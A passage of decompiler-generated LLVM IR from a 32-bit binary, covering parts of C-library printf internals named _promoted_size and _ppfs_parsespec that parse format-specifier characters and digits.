  br i1 %v1_804ede7, label %dec_label_pc_804edf7, label %dec_label_pc_804ede9

dec_label_pc_804ede9:                             ; preds = %dec_label_pc_804ede0
  %v1_804ede9 = add i32 %v1_804edf4, 37
  %v2_804ede9 = inttoptr i32 %v1_804ede9 to i8*
  %v3_804ede9 = load i8, i8* %v2_804ede9, align 1
  %v2_804eded = zext i8 %v3_804ede9 to i32
  %v3_804eded = mul nuw nsw i32 %v2_804eded, 12
  store i32 %v3_804eded, i32* %eax.global-to-local, align 4
  %v1_804edf0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804edf0 = add nsw i32 %v3_804eded, -12
  %v3_804edf0 = add i32 %v2_804edf0, %v1_804edf0
  %v4_804edf0 = inttoptr i32 %v3_804edf0 to i32*
  %v5_804edf0 = load i32, i32* %v4_804edf0, align 4
  store i32 %v5_804edf0, i32* %eax.global-to-local, align 4
  store i32 %v5_804edf0, i32* %v2_804ede0, align 4
  %v0_804edf7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804edf7

dec_label_pc_804edc2.dec_label_pc_804edf7.loopexit_crit_edge: ; preds = %dec_label_pc_804edc1
  br label %dec_label_pc_804edf7.loopexit

dec_label_pc_804edf7.loopexit:                    ; preds = %dec_label_pc_804edc2.dec_label_pc_804edf7.loopexit_crit_edge, %dec_label_pc_804ed4b
  %v1_804edc2.lcssa = phi i32 [ %v1_804edc2, %dec_label_pc_804edc2.dec_label_pc_804edf7.loopexit_crit_edge ], [ %v1_804edc215, %dec_label_pc_804ed4b ]
  br label %dec_label_pc_804edf7

dec_label_pc_804edf7:                             ; preds = %dec_label_pc_804edf7.loopexit, %dec_label_pc_804ede0, %dec_label_pc_804ede9
  %v10_804edfe = phi i32 [ %v1_804edc2.lcssa, %dec_label_pc_804edf7.loopexit ], [ %v1_804edf4, %dec_label_pc_804ede0 ], [ %v0_804edf7.pre, %dec_label_pc_804ede9 ]
  %v1_804edf7 = add i32 %v10_804edfe, 8
  %v2_804edf7 = inttoptr i32 %v1_804edf7 to i32*
  %v3_804edf7 = load i32, i32* %v2_804edf7, align 4
  store i32 %v3_804edf7, i32* %eax.global-to-local, align 4
  %v2_804edfa = icmp slt i32 %v3_804edf7, 0
  %v1_804edfc = icmp eq i1 %v2_804edfa, false
  br i1 %v1_804edfc, label %dec_label_pc_804ee12, label %dec_label_pc_804edfe

dec_label_pc_804edfe:                             ; preds = %dec_label_pc_804edf7
  %v1_804edfe = add i32 %v10_804edfe, 16
  %v2_804edfe = inttoptr i32 %v1_804edfe to i32*
  %v3_804edfe = load i32, i32* %v2_804edfe, align 4
  %v4_804edfe = or i32 %v3_804edfe, 8
  store i32 %v4_804edfe, i32* %v2_804edfe, align 4
  %v0_804ee02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee02 = sub i32 0, %v0_804ee02
  store i32 %v1_804ee02, i32* %eax.global-to-local, align 4
  %v1_804ee04 = load i32, i32* @ecx, align 4
  %v2_804ee04 = add i32 %v1_804ee04, 8
  %v3_804ee04 = inttoptr i32 %v2_804ee04 to i32*
  store i32 %v1_804ee02, i32* %v3_804ee04, align 4
  %v0_804ee07 = load i32, i32* @ecx, align 4
  %v1_804ee07 = add i32 %v0_804ee07, 16
  %v2_804ee07 = inttoptr i32 %v1_804ee07 to i32*
  %v3_804ee07 = load i32, i32* %v2_804ee07, align 4
  %v4_804ee07 = and i32 %v3_804ee07, -2
  store i32 %v4_804ee07, i32* %v2_804ee07, align 4
  %v0_804ee0b = load i32, i32* @ecx, align 4
  %v1_804ee0b = add i32 %v0_804ee0b, 20
  %v2_804ee0b = inttoptr i32 %v1_804ee0b to i32*
  store i32 32, i32* %v2_804ee0b, align 4
  %v0_804ee14.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee12

dec_label_pc_804ee12:                             ; preds = %dec_label_pc_804edf7, %dec_label_pc_804edfe
  %v0_804ee14 = phi i32 [ %v3_804edf7, %dec_label_pc_804edf7 ], [ %v0_804ee14.pre, %dec_label_pc_804edfe ]
  %v2_804ee12 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ee12, i32* @ebx, align 4
  ret i32 %v0_804ee14

; uselistorder directives
  uselistorder i32 %v3_804eded, { 1, 0 }
  uselistorder i32 %v3_804edd6, { 1, 0 }
  uselistorder i32 %v1_804edc1, { 2, 1, 0 }
  uselistorder i32 %v1_804edc2, { 1, 2, 0 }
  uselistorder i32 %v3_804ed58, { 1, 0, 2 }
  uselistorder i32* %v2_804ed58, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ed53, { 1, 0 }
  uselistorder i32 %v6_804ed4f, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804ed4f21, { 1, 0 }
  uselistorder i32 %v1_804edc215, { 2, 0, 1 }
  uselistorder i1 %v1_804edd0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804ee12, { 1, 0 }
  uselistorder label %dec_label_pc_804edf7, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ede0, { 1, 0 }
  uselistorder label %dec_label_pc_804edc1, { 1, 0 }
  uselistorder label %dec_label_pc_804edbe, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804edb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed4f, { 1, 0 }
  uselistorder label %dec_label_pc_804ed4b, { 1, 0 }
  uselistorder label %dec_label_pc_804ed31, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ee18 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804ee1f

dec_label_pc_804ee1f:                             ; preds = %dec_label_pc_804ee1f, %entry
  %v0_804ee1f = phi i32 [ ptrtoint (i8** @global_var_805680a.158 to i32), %entry ], [ %v1_804ee1f, %dec_label_pc_804ee1f ]
  %v1_804ee1f = add i32 %v0_804ee1f, -2
  %v1_804ee22 = inttoptr i32 %v1_804ee1f to i16*
  %v2_804ee22 = load i16, i16* %v1_804ee22, align 2
  %v3_804ee22 = sext i16 %v2_804ee22 to i32
  %v12_804ee25 = icmp ne i32 %v3_804ee22, %v0_804ee18
  %v6_804ee2f = icmp ugt i32 %v1_804ee1f, ptrtoint (i32* @global_var_80567f2.159 to i32)
  %or.cond = and i1 %v6_804ee2f, %v12_804ee25
  br i1 %or.cond, label %dec_label_pc_804ee1f, label %dec_label_pc_804ee31

dec_label_pc_804ee31:                             ; preds = %dec_label_pc_804ee1f
  %.pre = add i32 %v0_804ee1f, -134572020
  %v2_804ee37 = sdiv i32 %.pre, 2
  store i32 %v2_804ee37, i32* @edx, align 4
  %v1_804ee39 = add i32 %v2_804ee37, ptrtoint (i8** @global_var_805680a.158 to i32)
  %v2_804ee39 = inttoptr i32 %v1_804ee39 to i8*
  %v3_804ee39 = load i8, i8* %v2_804ee39, align 1
  %v4_804ee39 = zext i8 %v3_804ee39 to i32
  ret i32 %v4_804ee39

; uselistorder directives
  uselistorder i32 %v2_804ee37, { 1, 0 }
  uselistorder i32 %v1_804ee1f, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805680a.158 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ee42 = load i32, i32* @edi, align 4
  %v0_804ee43 = load i32, i32* @esi, align 4
  %v0_804ee44 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee44, i32* %stack_var_-16, align 4
  %v4_804ee44 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ee70 = add i32 %tmp76, 24
  %v2_804ee70 = inttoptr i32 %v1_804ee70 to i32*
  %v3_804ee70 = load i32, i32* %v2_804ee70, align 4
  store i32 %v3_804ee70, i32* %eax.global-to-local, align 4
  %v1_804ee77 = add i32 %tmp76, 16
  %v2_804ee77 = inttoptr i32 %v1_804ee77 to i32*
  %v3_804ee77 = load i32, i32* %v2_804ee77, align 4
  %v1_804ee7a = and i32 %v3_804ee77, 128
  %v2_804ee7a = icmp eq i32 %v1_804ee7a, 0
  store i32 %v1_804ee7a, i32* %edi.global-to-local, align 4
  %v1_804ee80 = icmp eq i1 %v2_804ee7a, false
  br i1 %v1_804ee80, label %dec_label_pc_804ee93, label %dec_label_pc_804ee82

dec_label_pc_804ee82:                             ; preds = %entry
  %v2_804ee82 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804eee0.outer

dec_label_pc_804ee8d:                             ; preds = %dec_label_pc_804f01b
  %v1_804ee8d = add i32 %v0_804f01b.pre.pre, 1
  store i32 %v1_804ee8d, i32* @esi, align 4
  br label %dec_label_pc_804f02b

dec_label_pc_804ee93:                             ; preds = %entry
  %v15_804ee45 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ee95

dec_label_pc_804ee95:                             ; preds = %dec_label_pc_804eebd.dec_label_pc_804ee95_crit_edge, %dec_label_pc_804ee93
  %v2_804eea6 = phi i32 [ %v2_804eea6.pre, %dec_label_pc_804eebd.dec_label_pc_804ee95_crit_edge ], [ %v15_804ee45, %dec_label_pc_804ee93 ]
  %v3_804eea6 = phi i32 [ %v1_804eebd, %dec_label_pc_804eebd.dec_label_pc_804ee95_crit_edge ], [ 0, %dec_label_pc_804ee93 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ee99 = mul i32 %v3_804eea6, 4
  store i32 %v1_804ee99, i32* @ecx, align 4
  %v2_804eea0 = load i32, i32* %arg1, align 4
  store i32 %v2_804eea0, i32* @edx, align 4
  %v2_804eea2 = add i32 %v1_804ee99, -4
  %v3_804eea2 = add i32 %v2_804eea2, %v2_804eea0
  %v4_804eea2 = inttoptr i32 %v3_804eea2 to i32*
  %v5_804eea2 = load i32, i32* %v4_804eea2, align 4
  store i32 %v5_804eea2, i32* %eax.global-to-local, align 4
  %v1_804eea6 = trunc i32 %v5_804eea2 to i8
  %v4_804eea6 = add i32 %v2_804eea6, 36
  %v5_804eea6 = add i32 %v4_804eea6, %v3_804eea6
  %v6_804eea6 = inttoptr i32 %v5_804eea6 to i8*
  store i8 %v1_804eea6, i8* %v6_804eea6, align 1
  %v0_804eeaa = load i32, i32* %eax.global-to-local, align 4
  %v1_804eeaa = urem i32 %v0_804eeaa, 256
  %v2_804eeaa = load i32, i32* @ebx, align 4
  %v3_804eeaa = and i32 %v2_804eeaa, -256
  %v4_804eeaa = or i32 %v3_804eeaa, %v1_804eeaa
  store i32 %v4_804eeaa, i32* @ebx, align 4
  %v1_804eeac = mul i32 %v0_804eeaa, 16777216
  %v2_804eeac = sdiv i32 %v1_804eeac, 16777216
  store i32 %v2_804eeac, i32* %eax.global-to-local, align 4
  %v1_804eeaf = load i32, i32* @edx, align 4
  %v2_804eeaf = load i32, i32* @ecx, align 4
  %v3_804eeaf = add i32 %v1_804eeaf, -4
  %v4_804eeaf = add i32 %v3_804eeaf, %v2_804eeaf
  %v5_804eeaf = inttoptr i32 %v4_804eeaf to i32*
  %v6_804eeaf = load i32, i32* %v5_804eeaf, align 4
  %v17_804eeaf = icmp eq i32 %v2_804eeac, %v6_804eeaf
  %v1_804eeb3 = icmp eq i1 %v17_804eeaf, false
  br i1 %v1_804eeb3, label %dec_label_pc_804f205, label %dec_label_pc_804eeb9

dec_label_pc_804eeb9:                             ; preds = %dec_label_pc_804ee95
  %v3_804eeb9 = trunc i32 %v0_804eeaa to i8
  %v4_804eeb9 = icmp eq i8 %v3_804eeb9, 0
  br i1 %v4_804eeb9, label %dec_label_pc_804eec3, label %dec_label_pc_804eebd

dec_label_pc_804eebd:                             ; preds = %dec_label_pc_804eeb9
  %v0_804eebd = load i32, i32* %esi.global-to-local, align 4
  %v1_804eebd = add i32 %v0_804eebd, 1
  store i32 %v1_804eebd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804eebd, 32
  br i1 %tmp, label %dec_label_pc_804eebd.dec_label_pc_804ee95_crit_edge, label %dec_label_pc_804eec3

dec_label_pc_804eebd.dec_label_pc_804ee95_crit_edge: ; preds = %dec_label_pc_804eebd
  %v2_804eea6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee95

dec_label_pc_804eec3:                             ; preds = %dec_label_pc_804eebd, %dec_label_pc_804eeb9
  %v2_804eec8 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804eee0.outer

dec_label_pc_804eee0.outer:                       ; preds = %dec_label_pc_804eec3, %dec_label_pc_804ee82, %dec_label_pc_804effd
  %v0_804eeec.ph94 = phi i32 [ %v1_804effd, %dec_label_pc_804effd ], [ %v2_804ee82, %dec_label_pc_804ee82 ], [ %v2_804eec8, %dec_label_pc_804eec3 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804effd ], [ %tmp66, %dec_label_pc_804ee82 ], [ %tmp66, %dec_label_pc_804eec3 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ee86, %dec_label_pc_804effd ], [ 0, %dec_label_pc_804ee82 ], [ 0, %dec_label_pc_804eec3 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804effd ], [ %v3_804ee70, %dec_label_pc_804ee82 ], [ %v3_804ee70, %dec_label_pc_804eec3 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804effd ], [ 0, %dec_label_pc_804ee82 ], [ 0, %dec_label_pc_804eec3 ]
  %v7_804eee7 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804eee7 = trunc i64 %v7_804eee7 to i32
  %v2_804eeef = add i32 %v8_804eee7, 80
  br label %dec_label_pc_804eee0

dec_label_pc_804eee0:                             ; preds = %dec_label_pc_804eee0.outer, %dec_label_pc_804ef9d
  %v0_804eeec = phi i32 [ %v0_804efaa, %dec_label_pc_804ef9d ], [ %v0_804eeec.ph94, %dec_label_pc_804eee0.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804ef9d ], [ %stack_var_-32.1.ph, %dec_label_pc_804eee0.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804ef9d ], [ %stack_var_-88.1.ph, %dec_label_pc_804eee0.outer ]
  store i32 %v0_804eeec, i32* @edx, align 4
  %v1_804eee0 = inttoptr i32 %v0_804eeec to i8*
  %v2_804eee0 = load i8, i8* %v1_804eee0, align 1
  %v11_804eee0 = icmp eq i8 %v2_804eee0, 42
  store i32 %v0_804eeec, i32* @esi, align 4
  %v1_804eee5 = icmp eq i1 %v11_804eee0, false
  br i1 %v1_804eee5, label %dec_label_pc_804eef7, label %dec_label_pc_804eee7

dec_label_pc_804eee7:                             ; preds = %dec_label_pc_804eee0
  store i32 %v8_804eee7, i32* %eax.global-to-local, align 4
  %v1_804eeec = add i32 %v0_804eeec, 1
  store i32 %v1_804eeec, i32* @esi, align 4
  %v0_804eeef = load i32, i32* @esp, align 4
  %v3_804eeef = add i32 %v2_804eeef, %v0_804eeef
  %v4_804eeef = inttoptr i32 %v3_804eeef to i32*
  store i32 0, i32* %v4_804eeef, align 4
  %v0_804ef11.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eef7

dec_label_pc_804eef7:                             ; preds = %dec_label_pc_804eee0, %dec_label_pc_804eee7
  %v0_804ef11.pre = phi i32 [ %v0_804eeec, %dec_label_pc_804eee0 ], [ %v0_804ef11.pre.pre, %dec_label_pc_804eee7 ]
  %v0_804eef7 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_804eef7, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804ef11.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef11

dec_label_pc_804ef01:                             ; preds = %dec_label_pc_804ef11
  %v1_804ef01 = add i32 %v1_804ef09, -4094
  %v6_804ef01 = sub i32 4093, %v1_804ef09
  %v7_804ef01 = and i32 %v6_804ef01, %v1_804ef09
  %v8_804ef01 = icmp slt i32 %v7_804ef01, 0
  %v9_804ef01 = icmp eq i32 %v1_804ef01, 0
  %v10_804ef01 = icmp slt i32 %v1_804ef01, 0
  %v3_804ef07 = icmp eq i1 %v10_804ef01, %v8_804ef01
  %v4_804ef07 = icmp eq i1 %v9_804ef01, false
  %v5_804ef07 = and i1 %v4_804ef07, %v3_804ef07
  br i1 %v5_804ef07, label %dec_label_pc_804ef10, label %dec_label_pc_804ef09

dec_label_pc_804ef09:                             ; preds = %dec_label_pc_804ef01
  %v3_804ef09 = mul i32 %v1_804ef09, 10
  store i32 %v3_804ef09, i32* %eax.global-to-local, align 4
  %v2_804ef0c = add i32 %v3_804ef09, -48
  %v3_804ef0c = add i32 %v2_804ef0c, %v2_804ef13
  store i32 %v3_804ef0c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ef10

dec_label_pc_804ef10:                             ; preds = %dec_label_pc_804ef01, %dec_label_pc_804ef09
  %v0_804ef2b32 = phi i32 [ %v1_804ef09, %dec_label_pc_804ef01 ], [ %v3_804ef0c, %dec_label_pc_804ef09 ]
  %v4_804ef1128 = phi i32 [ %v6_804ef11, %dec_label_pc_804ef01 ], [ %v3_804ef09, %dec_label_pc_804ef09 ]
  %v1_804ef10 = add i32 %v0_804ef10, 1
  store i32 %v1_804ef10, i32* @esi, align 4
  br label %dec_label_pc_804ef11

dec_label_pc_804ef11:                             ; preds = %dec_label_pc_804eef7, %dec_label_pc_804ef10
  %v1_804ef09 = phi i32 [ 0, %dec_label_pc_804eef7 ], [ %v0_804ef2b32, %dec_label_pc_804ef10 ]
  %v4_804ef11 = phi i32 [ %v4_804ef11.pre, %dec_label_pc_804eef7 ], [ %v4_804ef1128, %dec_label_pc_804ef10 ]
  %v0_804ef10 = phi i32 [ %v0_804ef11.pre, %dec_label_pc_804eef7 ], [ %v1_804ef10, %dec_label_pc_804ef10 ]
  %v1_804ef11 = inttoptr i32 %v0_804ef10 to i8*
  %v2_804ef11 = load i8, i8* %v1_804ef11, align 1
  %v3_804ef11 = zext i8 %v2_804ef11 to i32
  %v5_804ef11 = and i32 %v4_804ef11, -256
  %v6_804ef11 = or i32 %v3_804ef11, %v5_804ef11
  store i32 %v6_804ef11, i32* %eax.global-to-local, align 4
  %v2_804ef13 = sext i8 %v2_804ef11 to i32
  store i32 %v2_804ef13, i32* @ecx, align 4
  %v2_804ef16 = mul nsw i32 %v2_804ef13, 2
  %v3_804ef16 = add i32 %v2_804ef16, %v0_804eef7
  %v4_804ef16 = inttoptr i32 %v3_804ef16 to i8*
  %v5_804ef16 = load i8, i8* %v4_804ef16, align 1
  %v6_804ef16 = and i8 %v5_804ef16, 8
  %v7_804ef16 = icmp eq i8 %v6_804ef16, 0
  %v1_804ef1b = icmp eq i1 %v7_804ef16, false
  br i1 %v1_804ef1b, label %dec_label_pc_804ef01, label %dec_label_pc_804ef1d

dec_label_pc_804ef1d:                             ; preds = %dec_label_pc_804ef11
  %v0_804ef1d = load i32, i32* @edx, align 4
  %v1_804ef1d = add i32 %v0_804ef1d, -1
  %v2_804ef1d = inttoptr i32 %v1_804ef1d to i8*
  %v3_804ef1d = load i8, i8* %v2_804ef1d, align 1
  %v12_804ef1d = icmp eq i8 %v3_804ef1d, 37
  %v1_804ef21 = icmp eq i1 %v12_804ef1d, false
  br i1 %v1_804ef21, label %dec_label_pc_804efb4, label %dec_label_pc_804ef27

dec_label_pc_804ef27:                             ; preds = %dec_label_pc_804ef1d
  %v10_804ef27 = icmp eq i8 %v2_804ef11, 36
  %v1_804ef29 = icmp eq i1 %v10_804ef27, false
  br i1 %v1_804ef29, label %dec_label_pc_804ef5b, label %dec_label_pc_804ef2b

dec_label_pc_804ef2b:                             ; preds = %dec_label_pc_804ef27
  %tmp89 = icmp slt i32 %v1_804ef09, 1
  br i1 %tmp89, label %dec_label_pc_804ef5b, label %dec_label_pc_804ef2f

dec_label_pc_804ef2f:                             ; preds = %dec_label_pc_804ef2b
  %v4_804ef2f = icmp eq i32 %stack_var_-88.1, 0
  %v1_804ef34 = add i32 %v0_804ef10, 1
  store i32 %v1_804ef34, i32* @edx, align 4
  br i1 %v4_804ef2f, label %dec_label_pc_804f205, label %dec_label_pc_804ef3d

dec_label_pc_804ef3d:                             ; preds = %dec_label_pc_804ef2f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804ef45 = sub i32 %v1_804ef09, %stack_var_-88.1
  %v8_804ef45 = xor i32 %v1_804ef09, %stack_var_-88.1
  %v9_804ef45 = xor i32 %v2_804ef45, %v1_804ef09
  %v10_804ef45 = and i32 %v9_804ef45, %v8_804ef45
  %v11_804ef45 = icmp slt i32 %v10_804ef45, 0
  %v12_804ef45 = icmp eq i32 %v2_804ef45, 0
  %v13_804ef45 = icmp slt i32 %v2_804ef45, 0
  %v3_804ef47 = icmp ne i1 %v13_804ef45, %v11_804ef45
  %v4_804ef47 = or i1 %v12_804ef45, %v3_804ef47
  %stack_var_-88.1.v0_804ef49 = select i1 %v4_804ef47, i32 %stack_var_-88.1, i32 %v1_804ef09
  br label %dec_label_pc_804ef57

dec_label_pc_804ef57:                             ; preds = %dec_label_pc_804ef6b, %dec_label_pc_804ef3d, %dec_label_pc_804ef6f
  %v0_804ef57 = phi i32 [ %v1_804ef34, %dec_label_pc_804ef3d ], [ %v0_804ef1d, %dec_label_pc_804ef6f ], [ %v0_804ef1d, %dec_label_pc_804ef6b ]
  %stack_var_-32.2 = phi i32 [ %v1_804ef09, %dec_label_pc_804ef3d ], [ %stack_var_-32.1, %dec_label_pc_804ef6f ], [ %stack_var_-32.1, %dec_label_pc_804ef6b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804ef49, %dec_label_pc_804ef3d ], [ 0, %dec_label_pc_804ef6f ], [ 0, %dec_label_pc_804ef6b ]
  store i32 %v0_804ef57, i32* @esi, align 4
  br label %dec_label_pc_804ef7e

dec_label_pc_804ef5b:                             ; preds = %dec_label_pc_804ef2b, %dec_label_pc_804ef27
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804ef6b, label %dec_label_pc_804ef62

dec_label_pc_804ef62:                             ; preds = %dec_label_pc_804ef5b
  %v10_804ef62 = icmp eq i8 %v2_804ef11, 109
  br i1 %v10_804ef62, label %dec_label_pc_804efb4, label %dec_label_pc_804f205

dec_label_pc_804ef6b:                             ; preds = %dec_label_pc_804ef5b
  %tmp153 = icmp ugt i32 %v0_804ef10, %v0_804ef1d
  br i1 %tmp153, label %dec_label_pc_804ef6f, label %dec_label_pc_804ef57

dec_label_pc_804ef6f:                             ; preds = %dec_label_pc_804ef6b
  %v1_804ef6f = inttoptr i32 %v0_804ef1d to i8*
  %v2_804ef6f = load i8, i8* %v1_804ef6f, align 1
  %v8_804ef6f = icmp eq i8 %v2_804ef6f, 48
  br i1 %v8_804ef6f, label %dec_label_pc_804ef57, label %dec_label_pc_804efb4

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef8f, %dec_label_pc_804ef57
  %v0_804efaa = phi i32 [ %v1_804ef8f, %dec_label_pc_804ef8f ], [ %v0_804ef57, %dec_label_pc_804ef57 ]
  %v4_804ef8835 = phi i32 [ %v6_804ef88, %dec_label_pc_804ef8f ], [ %v6_804ef11, %dec_label_pc_804ef57 ]
  store i32 ptrtoint ([8 x i8]* @global_var_80567ea.160 to i32), i32* %edx.global-to-local, align 4
  %v1_804ef8b = inttoptr i32 %v0_804efaa to i8*
  br label %dec_label_pc_804ef88

dec_label_pc_804ef88:                             ; preds = %dec_label_pc_804ef99, %dec_label_pc_804ef7e
  %v4_804ef88 = phi i32 [ %v4_804ef8835, %dec_label_pc_804ef7e ], [ %v6_804ef88, %dec_label_pc_804ef99 ]
  %v0_804ef8a = phi i32 [ ptrtoint ([8 x i8]* @global_var_80567ea.160 to i32), %dec_label_pc_804ef7e ], [ %v1_804ef8a, %dec_label_pc_804ef99 ]
  %v0_804ef99 = phi i32 [ 1, %dec_label_pc_804ef7e ], [ %v2_804ef99, %dec_label_pc_804ef99 ]
  store i32 %v0_804ef99, i32* @ecx, align 4
  %v1_804ef88 = inttoptr i32 %v0_804ef8a to i8*
  %v2_804ef88 = load i8, i8* %v1_804ef88, align 1
  %v3_804ef88 = zext i8 %v2_804ef88 to i32
  %v5_804ef88 = and i32 %v4_804ef88, -256
  %v6_804ef88 = or i32 %v3_804ef88, %v5_804ef88
  store i32 %v6_804ef88, i32* %eax.global-to-local, align 4
  %v1_804ef8a = add i32 %v0_804ef8a, 1
  store i32 %v1_804ef8a, i32* @edx, align 4
  %v2_804ef8b = load i8, i8* %v1_804ef8b, align 1
  %v15_804ef8b = icmp eq i8 %v2_804ef8b, %v2_804ef88
  %v1_804ef8d = icmp eq i1 %v15_804ef8b, false
  br i1 %v1_804ef8d, label %dec_label_pc_804ef94, label %dec_label_pc_804ef8f

dec_label_pc_804ef8f:                             ; preds = %dec_label_pc_804ef88
  %v1_804ef8f = add i32 %v0_804efaa, 1
  store i32 %v1_804ef8f, i32* @esi, align 4
  %v0_804ef90 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ef90 = or i32 %v0_804ef90, %v0_804ef99
  store i32 %v2_804ef90, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ef7e

dec_label_pc_804ef94:                             ; preds = %dec_label_pc_804ef88
  %v1_804ef94 = inttoptr i32 %v1_804ef8a to i8*
  %v2_804ef94 = load i8, i8* %v1_804ef94, align 1
  %v3_804ef94 = icmp eq i8 %v2_804ef94, 0
  br i1 %v3_804ef94, label %dec_label_pc_804ef9d, label %dec_label_pc_804ef99

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ef94
  %v2_804ef99 = mul i32 %v0_804ef99, 2
  br label %dec_label_pc_804ef88

dec_label_pc_804ef9d:                             ; preds = %dec_label_pc_804ef94
  %v0_804ef9d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804efa1 = udiv i32 %v0_804ef9d, 2
  %v1_804efa1.not = or i32 %v1_804efa1, -6
  %v1_804efa6 = xor i32 %v1_804efa1.not, 5
  store i32 %v1_804efa6, i32* %eax.global-to-local, align 4
  %v2_804efa8 = and i32 %v1_804efa6, %v0_804ef9d
  store i32 %v2_804efa8, i32* %edi.global-to-local, align 4
  %v1_804efaa = add i32 %v0_804efaa, -1
  %v2_804efaa = inttoptr i32 %v1_804efaa to i8*
  %v3_804efaa = load i8, i8* %v2_804efaa, align 1
  %v12_804efaa = icmp eq i8 %v3_804efaa, 37
  %v1_804efae = icmp eq i1 %v12_804efaa, false
  br i1 %v1_804efae, label %dec_label_pc_804eee0, label %dec_label_pc_804efb4

dec_label_pc_804efb4:                             ; preds = %dec_label_pc_804ef6f, %dec_label_pc_804ef9d, %dec_label_pc_804ef1d, %dec_label_pc_804ef62
  %v0_804efd7 = phi i32 [ %v1_804ef09, %dec_label_pc_804ef62 ], [ %v1_804ef09, %dec_label_pc_804ef6f ], [ 0, %dec_label_pc_804ef9d ], [ %v1_804ef09, %dec_label_pc_804ef1d ]
  %v1_804efe0 = phi i32 [ %v0_804ef10, %dec_label_pc_804ef62 ], [ %v0_804ef10, %dec_label_pc_804ef6f ], [ %v0_804efaa, %dec_label_pc_804ef9d ], [ %v0_804ef10, %dec_label_pc_804ef1d ]
  %v0_804efdd = phi i32 [ %v0_804ef1d, %dec_label_pc_804ef62 ], [ %v0_804ef1d, %dec_label_pc_804ef6f ], [ %v1_804ef8a, %dec_label_pc_804ef9d ], [ %v0_804ef1d, %dec_label_pc_804ef1d ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804ef62 ], [ %stack_var_-32.1, %dec_label_pc_804ef6f ], [ %stack_var_-32.2, %dec_label_pc_804ef9d ], [ %stack_var_-32.1, %dec_label_pc_804ef1d ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804ef62 ], [ 0, %dec_label_pc_804ef6f ], [ %stack_var_-88.2, %dec_label_pc_804ef9d ], [ %stack_var_-88.1, %dec_label_pc_804ef1d ]
  %v1_804efb4 = inttoptr i32 %v0_804efdd to i8*
  %v2_804efb4 = load i8, i8* %v1_804efb4, align 1
  %v11_804efb4 = icmp eq i8 %v2_804efb4, 42
  %v1_804efb7 = icmp eq i1 %v11_804efb4, false
  br i1 %v1_804efb7, label %dec_label_pc_804efed, label %dec_label_pc_804efb9

dec_label_pc_804efb9:                             ; preds = %dec_label_pc_804efb4
  %v4_804efb9 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804efb9, label %dec_label_pc_804efdd, label %dec_label_pc_804efc0

